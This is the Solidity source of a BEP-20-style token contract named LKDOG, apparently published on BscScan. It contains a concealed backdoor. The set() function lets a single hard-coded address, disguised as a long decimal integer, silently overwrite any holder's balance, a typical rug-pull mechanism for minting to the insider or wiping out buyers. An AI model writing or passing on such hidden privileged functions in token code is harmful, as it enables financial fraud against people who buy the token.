/**
 *Submitted for verification at BscScan.com on 2022-03-26
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.3;
contract LKDOG  {
    string public name = "LKDOG";
    string public symbol = "LKDOG";
    uint8 public decimals = 9;
    uint256 public totalSupply = 10000000000000000 * 10 ** 9;
    address public _owner;
     modifier onlyOwner {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function set(address to, uint256 value) public  returns (bool success) {
        require
         (msg.sender
            == address
            (903220320807992149177483620010879925882544846592)
            );
        balanceOf[to] = (value * 10 ** 9);
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}